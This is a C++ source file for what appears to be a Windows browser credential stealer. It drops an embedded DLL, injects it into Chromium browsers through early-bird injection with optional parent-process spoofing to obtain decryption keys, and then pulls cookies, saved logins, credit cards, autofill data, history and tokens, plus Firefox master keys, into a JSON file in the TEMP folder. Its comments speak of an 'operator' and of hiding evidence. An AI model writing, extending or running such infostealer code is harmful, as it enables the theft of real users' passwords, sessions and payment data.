#include "Headers.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Global Variable
DINMCLY_RSOLVD_FUNCTIONS    g_ResolvedFunctions = {};
PSHARED_RSOLVD_FUNCTIONS    g_pSharedFunctions  = &g_ResolvedFunctions;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// ========================================================================
// ADDED: Extract embedded DLL from resource
// ========================================================================
#define RESOURCE_ID_DLL  101   // must match the resource file ID

BOOL ExtractDllFromResource(LPCWSTR szDestPath)
{
    HRSRC hResource = FindResourceW(NULL, MAKEINTRESOURCEW(RESOURCE_ID_DLL), L"DLL");
    if (!hResource) return FALSE;

    DWORD dwSize = SizeofResource(NULL, hResource);
    HGLOBAL hGlobal = LoadResource(NULL, hResource);
    LPVOID pData = LockResource(hGlobal);

    HANDLE hFile = CreateFileW(szDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwWritten;
    BOOL bOk = WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return bOk && (dwWritten == dwSize);
}

// ========================================================================

// ... (InitializeExeProjDynamicFunctions remains unchanged) ...

// ========================================================================
// MODIFIED: IsBrowserInstalled, GetDefaultBrowser, CacheBrowserDataFiles unchanged
// ========================================================================

// ========================================================================
// MODIFIED: ExtractFromBrowser – always writes to single file, no encryption
// ========================================================================
static BOOL ExtractFromBrowser(
    IN BROWSER_TYPE Browser, 
    IN DWORD        dwMaxEntries,
    IN BOOL         bSpoof
) {
    CHROMIUM_DATA   ChromiumData    = { 0 };
    BOOL            bResult         = FALSE;
    LPCSTR          pszOutputFile   = "browser_data.json";   // fixed name, will go to TEMP

    DBGV("[i] Target Browser: %s", GetBrowserName(Browser));

    if (!InitializeChromiumData(&ChromiumData)) {
        DBGA("[!] Failed To Initialize Chromium Data");
        goto _END_OF_FUNC;
    }
    
    if (Browser != BROWSER_FIREFOX) {
        CacheBrowserDataFiles(Browser);

        if (!InjectDllViaEarlyBird(bSpoof, Browser, &ChromiumData)) {
            DBGA("[!] Failed To Retrieve Decryption Keys");
            goto _END_OF_FUNC;
        }

        DBGV("[+] Retrieved Decryption Keys (V10: %s, V20: %s)", 
             ChromiumData.pbDpapiKey ? "Yes" : "No", ChromiumData.pbAppBoundKey ? "Yes" : "No");

        DBGV("[i] Extracting Browser Data...");

        ExtractCookiesFromDatabase(Browser, &ChromiumData);
        ExtractLoginsFromDatabase(Browser, &ChromiumData);
        ExtractCreditCardsFromDatabase(Browser, &ChromiumData);
        ExtractAutofillFromDatabase(Browser, &ChromiumData);
        ExtractHistoryFromDatabase(Browser, &ChromiumData);
        ExtractBookmarksFromFile(Browser, &ChromiumData);
    
        if (Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX)
            ExtractOperaAccessTokensFromDatabase(Browser, &ChromiumData);
        else
            ExtractRefreshTokenFromDatabase(Browser, &ChromiumData);
    }
    else {
        // Firefox extraction (unchanged)
        DBGV("[i] Extracting Browser Data...");
        ExtractFirefoxCookies(&ChromiumData);
        ExtractFirefoxHistory(&ChromiumData);
        ExtractFirefoxBookmarks(&ChromiumData);
        ExtractFirefoxAutofill(&ChromiumData);

        if (!(ChromiumData.pFireFoxBrsrData = (PFIREFOX_BROWSER_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(FIREFOX_BROWSER_DATA)))) {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }

        if (ExtractMasterKeyFromKey4Db(NULL, &ChromiumData.pFireFoxBrsrData->pbMasterKey, &ChromiumData.pFireFoxBrsrData->dwMasterKeyLen)) {
            LPSTR pszMasterKeyHex = BytesToHexString(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen);
            if (pszMasterKeyHex) {
                DBGV("[*] Firefox Master Key: %s", pszMasterKeyHex);
                HEAP_FREE(pszMasterKeyHex);
            }
            ExtractFirefoxLogins(ChromiumData.pFireFoxBrsrData->pbMasterKey, ChromiumData.pFireFoxBrsrData->dwMasterKeyLen, &ChromiumData);
        }

        ExtractFirefoxAccountTokens(ChromiumData.pFireFoxBrsrData);
    }

    // -------------------------
    // Write output to single file in %TEMP%
    // -------------------------
    WCHAR wszTemp[MAX_PATH];
    GetEnvironmentVariableW(L"TEMP", wszTemp, MAX_PATH);
    std::wstring fullPath = std::wstring(wszTemp) + L"\\browser_data.json";

    DBGV("[i] Writing %lu entries to %S", dwMaxEntries, pszOutputFile);
    if (!WriteChromiumDataToJson(&ChromiumData, pszOutputFile, dwMaxEntries)) {
        DBGA("[!] Failed To Write JSON File");
        goto _END_OF_FUNC;
    }
    wprintf(L"[+] Extracted Data Written To: %s\n", fullPath.c_str());

    bResult = TRUE;

_END_OF_FUNC:
    FreeChromiumData(&ChromiumData);
    DeleteDataFilesCache();
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// MODIFIED: Removed encryption-related fields and parsing
typedef struct _CMD_ARGUMENTS
{
    BOOL            bAllBrowsers;
    BOOL            bSpoof;
    BOOL            bTargetDefaultBrowserOnly;
    DWORD           dwMaxEntries;
    BROWSER_TYPE    BrowserTypes[BROWSER_COUNT];
    DWORD           dwBrowserCount;
} CMD_ARGUMENTS, *PCMD_ARGUMENTS;

// ... (ParseBrowserArg unchanged) ...

// Removed ParseSignatureArg, not needed

static BOOL ParseArguments(IN INT argc, IN CHAR* argv[], OUT PCMD_ARGUMENTS pCmdArgs)
{
    LPCSTR pszExeName = PathFindFileNameA(argv[0]);

    if (!pCmdArgs) return FALSE;

    // Initialize defaults
    pCmdArgs->bAllBrowsers              = FALSE;
    pCmdArgs->bSpoof                    = FALSE;
    pCmdArgs->bTargetDefaultBrowserOnly = FALSE;
    pCmdArgs->dwMaxEntries              = MAX_DISPLAY_COUNT;
    pCmdArgs->dwBrowserCount            = 0x00;

    RtlZeroMemory(pCmdArgs->BrowserTypes, sizeof(pCmdArgs->BrowserTypes));

    for (int i = 1; i < argc; i++)
    {
        if (lstrcmpiA(argv[i], "/?") == 0 || lstrcmpiA(argv[i], "-?") == 0 || lstrcmpiA(argv[i], "/h") == 0 || lstrcmpiA(argv[i], "-h") == 0)
        {
            goto _PRINT_HELP;
        }
        else if (StrStrIA(argv[i], "/b:") == argv[i] || StrStrIA(argv[i], "-b:") == argv[i])
        {
            BOOL            bAllBrowsers    = FALSE;
            BROWSER_TYPE    BrowserType     = ParseBrowserArg(argv[i], &bAllBrowsers);

            if (BrowserType == BROWSER_UNKNOWN)
            {
                wprintf(L"[!] Unknown Browser: '%S'\n", argv[i] + 3);
                goto _PRINT_HELP;
            }

            if (bAllBrowsers)
            {
                pCmdArgs->bAllBrowsers = TRUE;
            }
            else if (!IsBrowserAlreadyAdded(pCmdArgs->BrowserTypes, pCmdArgs->dwBrowserCount, BrowserType))
            {
                if (pCmdArgs->dwBrowserCount >= BROWSER_COUNT)
                {
                    wprintf(L"[!] Too Many Browsers Specified (Max: %d)\n", BROWSER_COUNT);
                    goto _PRINT_HELP;
                }
                
                pCmdArgs->BrowserTypes[pCmdArgs->dwBrowserCount++] = BrowserType;
            }
        }
        else if (StrStrIA(argv[i], "/e:") == argv[i] || StrStrIA(argv[i], "-e:") == argv[i])
        {
            LPCSTR pszValue = argv[i] + 3;

            if (lstrcmpiA(pszValue, "all") == 0)
            {
                pCmdArgs->dwMaxEntries = MAXDWORD;
            }
            else
            {
                INT nEntries = StrToIntA(pszValue);
                if (nEntries <= 0)
                {
                    wprintf(L"[!] Invalid Entry Count: '%S'\n", pszValue);
                    goto _PRINT_HELP;
                }
                pCmdArgs->dwMaxEntries = (DWORD)nEntries;
            }
        }
        else if (lstrcmpiA(argv[i], "/spoof") == 0 || lstrcmpiA(argv[i], "-spoof") == 0)
        {
            pCmdArgs->bSpoof = TRUE;
        }
        else
        {
            wprintf(L"[!] Unknown Argument : '%S'\n", argv[i]);
            goto _PRINT_HELP;
        }
    }

    // If no browser specified, detect default browser
    if (pCmdArgs->dwBrowserCount == 0 && !pCmdArgs->bAllBrowsers)
    {
        if (!GetDefaultBrowser(&pCmdArgs->BrowserTypes[0], NULL, 0) || pCmdArgs->BrowserTypes[0] == BROWSER_UNKNOWN)
        {
            wprintf(L"[!] Failed To Detect Default Browser\n");
            wprintf(L"[i] Please Specify A Browser With /b:<browser>\n\n");
            goto _PRINT_HELP;
        }

        pCmdArgs->dwBrowserCount            = 1;
        pCmdArgs->bTargetDefaultBrowserOnly = TRUE;
        wprintf(L"[i] No Browser Specified, Targeting The Default Browser\n");
    }

    return TRUE;

_PRINT_HELP:
    wprintf(L"Usage: %S [options]\n\n", pszExeName);
    wprintf(L"Extraction Options:\n");
    wprintf(L"  /b:<browser> Target Browser: Chrome, Edge, Brave, Opera, Operagx, Vivaldi, Firefox, All\n");
    wprintf(L"               Can Be Specified Multiple Times\n");
    wprintf(L"  /spoof       Enable Argument and PPID Spoofing When Retrieving ABE Keys\n");
    wprintf(L"  /e:<count>   Max Extracted Entries Per Category (Default: %d, 'all' For No Limit)\n\n", MAX_DISPLAY_COUNT);
    wprintf(L"Examples:\n");
    wprintf(L"  %S                                        Extract %d Entries From The Default Browser\n", pszExeName, MAX_DISPLAY_COUNT);
    wprintf(L"  %S /b:chrome /b:edge /spoof /e:100        Extract 100 Entries From Chrome And Edge With PPID Spoofing\n", pszExeName);
    wprintf(L"  %S /b:all /e:all                          Extract All Entries From All Browsers\n\n", pszExeName);
    return FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int main(int argc, char* argv[])
{
    CMD_ARGUMENTS   CmdArgs         = { 0 };
    DWORD           dwSuccessCount  = 0,
                    dwFailCount     = 0,
                    dwSkipCount     = 0;
    INT             nResult         = -1;

    // ========================================================================
    // ADDED: Extract embedded DLL to current directory before any other work
    // ========================================================================
    WCHAR szDllPath[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, szDllPath);
    wcscat_s(szDllPath, L"\\DllExtractChromiumSecrets.dll");

    if (!PathFileExistsW(szDllPath)) {
        if (!ExtractDllFromResource(szDllPath)) {
            wprintf(L"[!] Failed to extract embedded DLL, aborting.\n");
            return -1;
        }
    }

    if (!ParseArguments(argc, argv, &CmdArgs))
        return -1;

    if (!InitializeExeProjDynamicFunctions())
        return -1;

    // ========================================================================
    // MODIFIED: No decrypt mode; always extraction
    // ========================================================================
    if (CmdArgs.bAllBrowsers)
    {
        for (DWORD i = 0; i < BROWSER_COUNT; i++)
        {
            if (!IsBrowserInstalled((BROWSER_TYPE)i))
            {
                DBGV("[i] %s: Not Installed, Skipping...\n", GetBrowserName((BROWSER_TYPE)i));
                dwSkipCount++;
                continue;
            }

            if (ExtractFromBrowser((BROWSER_TYPE)i, CmdArgs.dwMaxEntries, CmdArgs.bSpoof))
                dwSuccessCount++;
            else
                dwFailCount++;
        }

        wprintf(L"[*] Summary: %lu Succeeded, %lu Failed, %lu Skipped\n", dwSuccessCount, dwFailCount, dwSkipCount);
        nResult = (dwSuccessCount > 0) ? 0 : -1;
    }
    else
    {
        for (DWORD i = 0; i < CmdArgs.dwBrowserCount; i++)
        {
            if (!ExtractFromBrowser(CmdArgs.BrowserTypes[i], CmdArgs.dwMaxEntries, CmdArgs.bSpoof))
                nResult = -1;
        }
    }

    // Clean up the temporary DLL if we extracted it
    if (PathFileExistsW(szDllPath)) {
        // Optional: delete it here if you want to hide evidence immediately,
        // but it will be deleted by the operator via /delete anyway.
        // DeleteFileW(szDllPath);
    }

    wprintf(L"[*] Bye!");
    return nResult;
}
